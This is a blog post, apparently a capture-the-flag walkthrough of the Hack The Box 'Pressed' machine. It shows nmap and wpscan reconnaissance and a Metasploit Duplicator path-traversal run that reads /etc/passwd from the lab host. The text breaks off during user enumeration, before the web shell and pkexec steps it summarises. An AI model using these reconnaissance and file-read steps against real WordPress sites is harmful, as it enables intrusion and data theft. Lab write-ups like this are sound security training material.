<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
<title>HTB Pressed Write-up | Jordan&#39;s Blog</title>
<meta name="title" content="HTB Pressed Write-up" />
<meta name="description" content="A write-up for the Pressed box." />
<meta name="keywords" content="HTB,Pentesting," />


<meta property="og:url" content="https://jordangalida.github.io/htb-pressed-write-up/">
  <meta property="og:site_name" content="Jordan&#39;s Blog">
  <meta property="og:title" content="HTB Pressed Write-up">
  <meta property="og:description" content="A write-up for the Pressed box.">
  <meta property="og:locale" content="en_US">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2025-03-13T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-03-13T00:00:00+00:00">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Pentesting">
    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">




  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
  <meta name="twitter:title" content="HTB Pressed Write-up">
  <meta name="twitter:description" content="A write-up for the Pressed box.">




  <meta itemprop="name" content="HTB Pressed Write-up">
  <meta itemprop="description" content="A write-up for the Pressed box.">
  <meta itemprop="datePublished" content="2025-03-13T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-03-13T00:00:00+00:00">
  <meta itemprop="wordCount" content="3353">
  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
  <meta itemprop="keywords" content="HTB,Pentesting">
<meta name="referrer" content="no-referrer-when-downgrade" />

  <style>
  :root {
      --width: 800px;
      --font-main: "Courier New", monospace;
      --font-secondary: "Courier New", monospace;
      --font-scale: 1em;
      --background-color: #fff;
      --heading-color: #222;
      --text-color: #444;
      --link-color: #32ab60;
      --visited-color:  #32ab60;
      --code-background-color: #f2f2f2;
      --code-color: #222;
      --blockquote-color: #222;
      --overflow-wrap: break-word;
  }

  @media (prefers-color-scheme: dark) {
      :root {
          --background-color: #070b0a;
          --heading-color: #32ab60;
          --text-color: #32ab60;
          --link-color: #32ab60;
          --visited-color:  #32ab60;
          --code-background-color: #272822;
          --code-color: #ddd;
          --blockquote-color: #ccc;
      }
  }

  body {
      font-family: var(--font-secondary);
      font-size: var(--font-scale);
      margin: auto;
      padding: 20px;
      max-width: var(--width);
      text-align: left;
      background-color: var(--background-color);
      word-wrap: break-word;
      overflow-wrap: break-word;
      white-space: normal;
      line-height: 1.5;
      color: var(--text-color);
  }

  h1, h2, h3, h4, h5, h6 {
      font-family: var(--font-main);
      color: var(--heading-color);
  }

  a {
      color: var(--link-color);
      cursor: pointer;
      text-decoration: none;
  }

  a:hover {
      text-decoration: underline; 
  }

  nav a {
      margin-right: 8px;
  }

  strong, b {
      color: var(--heading-color);
  }

  button {
      margin: 0;
      cursor: pointer;
  }

  main {
      line-height: 1.6;
  }

  table {
      width: 100%;
  }

  hr {
      border: 0;
      border-top: 1px dashed;
  }

  img {
      max-width: 100%;
  }

  pre {
      white-space: pre-wrap !important;
      overflow-x: auto !important;
      word-break: break-all !important;
      max-width: var(--width) !important;
      margin: 0 !important;
  }

  code {
      font-family: "Courier New", monospace;
      background-color: var(--code-background-color);
      color: var(--code-color);
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow-wrap: anywhere;
  }

  blockquote {
      border-left: 1px solid #999;
      color: var(--code-color);
      padding-left: 20px;
      font-style: italic;
      text-wrap: wrap;
  }

  footer {
      padding: 25px 0;
      text-align: center;
  }

  .title:hover {
      text-decoration: none;
  }

  .title h1 {
      font-size: 1.5em;
  }

  .inline {
      width: auto !important;
  }

  .highlight, .code {
      background-color: var(--code-background-color);
      color: var(--code-color);
      padding: 5px 10px;
      word-break: normal;
      white-space: pre-wrap; 
      overflow-wrap: anywhere;
      overflow-x: auto;
  }

   
  ul.blog-posts {
      list-style-type: none;
      padding: unset;
  }

  ul.blog-posts li {
      display: flex;
  }

  ul.blog-posts li span {
      flex: 0 0 130px;
  }

  ul.blog-posts li a:visited {
      color: var(--visited-color);
</style>

</head>

<body>
  <header><a href="/" class="title">
  <h2>Jordan&#39;s Blog</h2>
</a>
<nav><a href="/">Home</a>


<a href="/blog">Blog</a>

</nav>
</header>
  <main>

<h1>HTB Pressed Write-up</h1>
<p>
  <i>
    <time datetime='2025-03-13'>
      13 Mar, 2025
    </time>
  </i>
</p>

<content>
  <p>This box starts off by finding a WordPress instance that leaks a backup of <code>wp-config</code> which includes admin credentials. There is also a file disclosure vulnerability in one of the plugins, which you could get the <code>wp-config</code> that way also. Attempting to log into WordPress is prevented by a MFA plugin. Instead, we are able to utilize XML-RPC to interact with the instance and gain initial access by creating a web shell. There are strict firewall rules in place to block you from obtaining a reverse shell, so everything must be done through the web shell or a forward-shell. We find a <code>pkexec</code> version on the machine that is vulnerable to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034">CVE-2021-4034</a>, which we are able to exploit to gain root access.</p>
<hr>
<p>As always we start off with our <code>nmap</code> scan with scripts and version detection enabled on all ports</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.11.142 -oA Scans/
</span></span><span style="display:flex;"><span>[sudo] password for jsmooth:
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 15:44 EDT
</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.142
</span></span><span style="display:flex;"><span>Host is up (0.019s latency).
</span></span><span style="display:flex;"><span>Not shown: 65534 filtered tcp ports (no-response)
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
</span></span><span style="display:flex;"><span>|_http-title: UHC Jan Finals &amp;#8211; New Month, New Boxes
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-generator: WordPress 5.9
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 122.91 seconds
</span></span></code></pre></div><p>Only two ports open. Looks like the website is WordPress 5.9. Let&rsquo;s check out the website
<img src="/images/Pressed/website.png" alt="Website"></p>
<p>Let&rsquo;s do a <code>wpscan</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$docker run -it --rm --network<span style="color:#f92672">=</span>host wpscanteam/wpscan -e ap -t <span style="color:#ae81ff">500</span> --url http://10.10.11.142 --detection-mode aggressive --plugins-detection aggressive
</span></span><span style="display:flex;"><span>_______________________________________________________________
</span></span><span style="display:flex;"><span>         __          _______   _____
</span></span><span style="display:flex;"><span>         \ \        / /  __ \ / ____|
</span></span><span style="display:flex;"><span>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
</span></span><span style="display:flex;"><span>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
</span></span><span style="display:flex;"><span>            \  /\  /  | |     ____) | (__| (_| | | | |
</span></span><span style="display:flex;"><span>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>         WordPress Security Scanner by the WPScan Team
</span></span><span style="display:flex;"><span>                         Version 3.8.27
</span></span><span style="display:flex;"><span>       Sponsored by Automattic - https://automattic.com/
</span></span><span style="display:flex;"><span>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span></span><span style="display:flex;"><span>_______________________________________________________________
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[i] It seems like you have not updated the database for some time.
</span></span><span style="display:flex;"><span>[?] Do you want to update now? [Y]es [N]o, default: [N]N
</span></span><span style="display:flex;"><span>[+] URL: http://10.10.11.142/ [10.10.11.142]
</span></span><span style="display:flex;"><span>[+] Started: Fri Mar 14 20:41:21 2025
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Interesting Finding(s):
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] XML-RPC seems to be enabled: http://10.10.11.142/xmlrpc.php
</span></span><span style="display:flex;"><span> | Found By: Direct Access (Aggressive Detection)
</span></span><span style="display:flex;"><span> | Confidence: 100%
</span></span><span style="display:flex;"><span> | References:
</span></span><span style="display:flex;"><span> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
</span></span><span style="display:flex;"><span> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span></span><span style="display:flex;"><span> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span></span><span style="display:flex;"><span> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span></span><span style="display:flex;"><span> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] WordPress readme found: http://10.10.11.142/readme.html
</span></span><span style="display:flex;"><span> | Found By: Direct Access (Aggressive Detection)
</span></span><span style="display:flex;"><span> | Confidence: 100%
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Upload directory has listing enabled: http://10.10.11.142/wp-content/uploads/
</span></span><span style="display:flex;"><span> | Found By: Direct Access (Aggressive Detection)
</span></span><span style="display:flex;"><span> | Confidence: 100%
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] The external WP-Cron seems to be enabled: http://10.10.11.142/wp-cron.php
</span></span><span style="display:flex;"><span> | Found By: Direct Access (Aggressive Detection)
</span></span><span style="display:flex;"><span> | Confidence: 60%
</span></span><span style="display:flex;"><span> | References:
</span></span><span style="display:flex;"><span> |  - https://www.iplocation.net/defend-wordpress-from-ddos
</span></span><span style="display:flex;"><span> |  - https://github.com/wpscanteam/wpscan/issues/1299
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
</span></span><span style="display:flex;"><span> | Found By: Atom Generator (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/index.php/feed/atom/, &lt;generator uri=&#34;https://wordpress.org/&#34; version=&#34;5.9&#34;&gt;WordPress&lt;/generator&gt;
</span></span><span style="display:flex;"><span> | Confirmed By: Style Etag (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-admin/load-styles.php, Match: &#39;5.9&#39;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[i] The main theme could not be detected.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Enumerating All Plugins (via Aggressive Methods)
</span></span><span style="display:flex;"><span> Checking Known Locations - Time: 00:02:36 &lt;=============================================================================&gt; (109141 / 109141) 100.00% Time: 00:02:36
</span></span><span style="display:flex;"><span>[+] Checking Plugin Versions (via Passive and Aggressive Methods)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[i] Plugin(s) Identified:
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] akismet
</span></span><span style="display:flex;"><span> | Location: http://10.10.11.142/wp-content/plugins/akismet/
</span></span><span style="display:flex;"><span> | Last Updated: 2025-02-14T18:49:00.000Z
</span></span><span style="display:flex;"><span> | Readme: http://10.10.11.142/wp-content/plugins/akismet/readme.txt
</span></span><span style="display:flex;"><span> | [!] The version is out of date, the latest version is 5.3.7
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Found By: Known Locations (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/akismet/, status: 200
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Version: 4.2.2 (100% confidence)
</span></span><span style="display:flex;"><span> | Found By: Readme - Stable Tag (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/akismet/readme.txt
</span></span><span style="display:flex;"><span> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/akismet/readme.txt
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] duplicator
</span></span><span style="display:flex;"><span> | Location: http://10.10.11.142/wp-content/plugins/duplicator/
</span></span><span style="display:flex;"><span> | Last Updated: 2024-11-21T15:50:00.000Z
</span></span><span style="display:flex;"><span> | Readme: http://10.10.11.142/wp-content/plugins/duplicator/readme.txt
</span></span><span style="display:flex;"><span> | [!] The version is out of date, the latest version is 1.5.11.2
</span></span><span style="display:flex;"><span> | [!] Directory listing is enabled
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Found By: Known Locations (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/duplicator/, status: 200
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Version: 1.3.26 (80% confidence)
</span></span><span style="display:flex;"><span> | Found By: Readme - Stable Tag (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/duplicator/readme.txt
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] miniorange-2-factor-authentication
</span></span><span style="display:flex;"><span> | Location: http://10.10.11.142/wp-content/plugins/miniorange-2-factor-authentication/
</span></span><span style="display:flex;"><span> | Last Updated: 2024-11-21T13:37:00.000Z
</span></span><span style="display:flex;"><span> | Readme: http://10.10.11.142/wp-content/plugins/miniorange-2-factor-authentication/readme.txt
</span></span><span style="display:flex;"><span> | [!] The version is out of date, the latest version is 6.0.5
</span></span><span style="display:flex;"><span> | [!] Directory listing is enabled
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Found By: Known Locations (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/miniorange-2-factor-authentication/, status: 200
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Version: 5.4.51 (80% confidence)
</span></span><span style="display:flex;"><span> | Found By: Readme - Stable Tag (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/miniorange-2-factor-authentication/readme.txt
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] php-everywhere
</span></span><span style="display:flex;"><span> | Location: http://10.10.11.142/wp-content/plugins/php-everywhere/
</span></span><span style="display:flex;"><span> | Latest Version: 3.0.0 (up to date)
</span></span><span style="display:flex;"><span> | Last Updated: 2022-01-10T23:05:00.000Z
</span></span><span style="display:flex;"><span> | Readme: http://10.10.11.142/wp-content/plugins/php-everywhere/readme.txt
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Found By: Known Locations (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/php-everywhere/, status: 200
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Version: 3.0.0 (50% confidence)
</span></span><span style="display:flex;"><span> | Found By: Readme - ChangeLog Section (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/php-everywhere/readme.txt
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] relative-url
</span></span><span style="display:flex;"><span> | Location: http://10.10.11.142/wp-content/plugins/relative-url/
</span></span><span style="display:flex;"><span> | Latest Version: 0.1.8 (up to date)
</span></span><span style="display:flex;"><span> | Last Updated: 2021-08-11T18:45:00.000Z
</span></span><span style="display:flex;"><span> | Readme: http://10.10.11.142/wp-content/plugins/relative-url/readme.txt
</span></span><span style="display:flex;"><span> | [!] Directory listing is enabled
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Found By: Known Locations (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/relative-url/, status: 200
</span></span><span style="display:flex;"><span> |
</span></span><span style="display:flex;"><span> | Version: 0.1.8 (100% confidence)
</span></span><span style="display:flex;"><span> | Found By: Readme - Stable Tag (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/relative-url/readme.txt
</span></span><span style="display:flex;"><span> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  - http://10.10.11.142/wp-content/plugins/relative-url/readme.txt
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[!] No WPScan API Token given, as a result vulnerability data has not been output.
</span></span><span style="display:flex;"><span>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Finished: Fri Mar 14 20:44:09 2025
</span></span><span style="display:flex;"><span>[+] Requests Done: 109194
</span></span><span style="display:flex;"><span>[+] Cached Requests: 12
</span></span><span style="display:flex;"><span>[+] Data Sent: 29.214 MB
</span></span><span style="display:flex;"><span>[+] Data Received: 14.784 MB
</span></span><span style="display:flex;"><span>[+] Memory used: 488.945 MB
</span></span><span style="display:flex;"><span>[+] Elapsed time: 00:02:48
</span></span></code></pre></div><p>Looks like some of the plugins have &ldquo;directory listing&rdquo; enabled. A quick Google search for <code>duplicator version 1.3.26 vulnerabilities</code> shows a file vulnerability. MetaSploit has a module for it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[msf](Jobs:0 Agents:0) &gt;&gt; search wp_duplicator_file_read
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Matching Modules
</span></span><span style="display:flex;"><span>================
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>   #  Name                                            Disclosure Date  Rank    Check  Description
</span></span><span style="display:flex;"><span>   -  ----                                            ---------------  ----    -----  -----------
</span></span><span style="display:flex;"><span>   0  auxiliary/scanner/http/wp_duplicator_file_read  2020-02-19       normal  No     WordPress Duplicator File Read Vulnerability
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_duplicator_file_read
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[msf](Jobs:0 Agents:0) &gt;&gt; use 0
</span></span><span style="display:flex;"><span>[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_duplicator_file_read) &gt;&gt; show options
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Module options (auxiliary/scanner/http/wp_duplicator_file_read):
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>   Name       Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----       ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   DEPTH      5                yes       Traversal Depth (to reach the root folder)
</span></span><span style="display:flex;"><span>   FILEPATH   /etc/passwd      yes       The path to the file to read
</span></span><span style="display:flex;"><span>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span></span><span style="display:flex;"><span>   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
</span></span><span style="display:flex;"><span>   RPORT      80               yes       The target port (TCP)
</span></span><span style="display:flex;"><span>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span></span><span style="display:flex;"><span>   TARGETURI  /                yes       The base path to the wordpress application
</span></span><span style="display:flex;"><span>   THREADS    1                yes       The number of concurrent threads (max one per host)
</span></span><span style="display:flex;"><span>   VHOST                       no        HTTP server virtual host
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_duplicator_file_read) &gt;&gt; set rhosts 10.10.11.142
</span></span><span style="display:flex;"><span>rhosts =&gt; 10.10.11.142
</span></span><span style="display:flex;"><span>[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_duplicator_file_read) &gt;&gt; run
</span></span><span style="display:flex;"><span>[*] Downloading file...
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>htb:x:1000:1000:htb:/home/htb:/bin/bash
</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style="display:flex;"><span>mysql:x:109:118:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] File saved in: /root/.msf4/loot/20250314164931_default_10.10.11.142_duplicator.trave_518610.txt
</span></span><span style="display:flex;"><span>[*] Scanned 1 of 1 hosts (100% complete)
</span></span><span style="display:flex;"><span>[*] Auxiliary module execution completed
</span></span></code></pre></div><p>I see one user <code>htb</code> with a shell. Good to know. Enumerating users only finds the admin user</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$docker run -it --rm --network<span style="color:#f92672">=</span>host wpscanteam/wpscan -e u -t <span style="color:#ae81ff">500</span> --url http://10.10.11.142
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Enumerating Users (via Passive and Aggressive Methods)
</span></span><span style="display:flex;"><span> Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[i] User(s) Identified:
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] admin
</span></span><span style="display:flex;"><span> | Found By: Rss Generator (Passive Detection)
</span></span><span style="display:flex;"><span> | Confirmed By:
</span></span><span style="display:flex;"><span> |  Wp Json Api (Aggressive Detection)
</span></span><span style="display:flex;"><span> |   - http://10.10.11.142/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
</span></span><span style="display:flex;"><span> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
</span></span><span style="display:flex;"><span> |  Login Error Messages (Aggressive Detection)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[!] No WPScan API Token given, as a result vulnerability data has not been output.
</span></span><span style="display:flex;"><span>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Finished: Fri Mar 14 20:59:36 2025
</span></span><span style="display:flex;"><span>[+] Requests Done: 55
</span></span><span style="display:flex;"><span>[+] Cached Requests: 6
</span></span><span style="display:flex;"><span>[+] Data Sent: 12.99 KB
</span></span><span style="display:flex;"><span>[+] Data Received: 130.02 KB
